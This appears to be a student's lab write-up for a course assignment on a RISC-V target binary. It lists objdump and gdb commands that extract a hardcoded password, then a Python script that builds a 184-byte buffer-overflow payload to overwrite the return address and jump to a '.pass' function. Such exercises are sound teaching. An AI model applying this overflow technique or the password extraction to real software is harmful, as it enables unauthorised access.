[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)

## **commands used in q3:** <br/>
###    Convert binary to riscv: <br/>
        ```riscv64-linux-gnu-objdump -d target_abhipsamishra2912 > layout.txt```
        <br/>
### Enable execute permission: <br/>
        ```chmod +x target_abhipsamishra2912```
        <br/>
### Find main in the layout.txt:
    <br/>
        ```grep -n "<main>" layout.txt```
        <br/>
###   then from the found address i did:<br/>
        ```sed -n '208,270p' layout.txt``` <br/>
        ```objdump -s --section=.rodata target_abhipsamishra2912 | less``` <br/>

        python3 -c "
            with open('target_abhipsamishra2912', 'rb') as f:
            f.seek(0x4e091)
            data = f.read(64)
            password = data.split(b'\x00')[0].decode('ascii')
            print(password)
        "
<br/>
        ```echo -n "KaIZoWc81XOgReo2Tc/jWnbeN57fJHqZk2PTu1fyzxE=" > payload.txt```

        ```./target_abhipsamishra2912 < payload.txt```

## **alternate way for q3 a:**
### using gdb

    ```sudo apt install gdb-multiarch qemu-user```
    <br/>

    in current window: echo "hello" | qemu-riscv64 -g 1234 ./target_abhipsamishra2912
    in another window: gdb-multiarch ./target_abhipsamishra2912

    in gdb: target remote localhost:1234
            disassemble main
            address right before strcmp is 0x1064c
            so break *0x1064c
            continue
            info registers a0 a1
            x/s $a1
            this gives the password
            echo "the_string" > payload.txt
            ./target_abhipsamishra2912 < payload.txt

**commands for 3b:**
    opened gdb: qemu-riscv64 -g 1234 ./target_abhipsamishra2912

    in another terminal: gdb-multiarch ./target_abhipsamishra2912
    stack allocation is 16
    ra saved at 8
    then again add buffer 176
    so 176 + 8 = 184
    so we figured 184

    python3 -c "
    import struct 
    padding = b'A' * 184
    target = struct.pack('<Q', 0x104e8)  
    payload = padding + target
    with open('payload', 'wb') as f:
        f.write(payload)
    print('payload written')
    "

    struct converts numbers into raw bytes
    padding creates 184 bytes  of 'A'
    0x104e8 is address of .pass function
    < means little-endian lsb first
    q- 8 byte unsigned long long i.e 64 bits address
    final memory layout = padding + target
    i.e. it first fills buffer then overwrites return address with 0x104e8
    opens file in binary mode, writes raw bytes
    When you feed this file into a vulnerable program:
    Buffer gets filled with 184 'A's
    Return address gets overwritten with 0x104e8
    When function returns it jumps to .pass

    ./target_abhipsamishra2912